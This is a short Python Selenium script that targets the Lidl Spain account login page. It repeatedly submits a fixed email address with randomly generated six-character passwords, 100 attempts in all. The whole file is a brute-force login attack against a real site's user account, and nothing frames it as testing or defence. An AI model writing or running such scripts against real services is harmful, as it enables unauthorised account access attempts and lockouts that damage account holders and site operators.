import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.common.keys import Keys

url='https://www.lidl.es/es/account/login?redirectTarget=previous-orders'
user='lwillh_o997h@pebih.com'
boton_cookies='#CybotCookiebotDialog > div > div.cookie-alert-extended-controls > button'
selector_user='#email-login-checkout'
selector_pass='#password-login-checkout'
boton_login='#chooseaccountbutton-login-checkout'

alfabeto='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

driver = webdriver.Chrome()
driver.maximize_window()
driver.get(url)
time.sleep(5)
driver.find_element_by_css_selector(boton_cookies).click()
for i in range(100):
    password=''.join(random.choice(alfabeto) for j in range(6))
    driver.find_element_by_css_selector(selector_user).send_keys(user)

    driver.find_element_by_css_selector(selector_pass).send_keys(password)

    driver.find_element_by_css_selector(boton_login).send_keys(Keys.ENTER)

    driver.refresh()

    driver.find_element_by_css_selector(selector_user).send_keys(user)

    driver.find_element_by_css_selector(selector_pass).send_keys(password)

    driver.find_element_by_css_selector(boton_login).send_keys(Keys.ENTER)

    print(i)
    time.sleep(3)
